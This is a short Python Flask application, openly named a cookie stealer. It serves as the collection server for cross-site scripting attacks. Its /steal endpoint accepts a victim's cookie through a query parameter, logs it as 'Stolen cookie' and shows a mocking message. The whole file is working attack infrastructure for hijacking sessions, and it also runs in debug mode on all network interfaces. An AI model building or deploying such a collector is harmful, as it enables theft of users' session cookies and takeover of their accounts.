from flask import Flask, request, render_template  
  
stealer_app = Flask(__name__)  
  
@stealer_app.route('/steal')  
def steal():  
    cookie = request.args.get('cookie')  
    print(f'Stolen cookie: {cookie}')  
    message = f'Hahahahahaha Deepak has your Cookie and I know ={cookie}'  
    return render_template('index.html', message=message)  
  
if __name__ == "__main__":  
    stealer_app.run(host='0.0.0.0', port=5005, debug=True)  
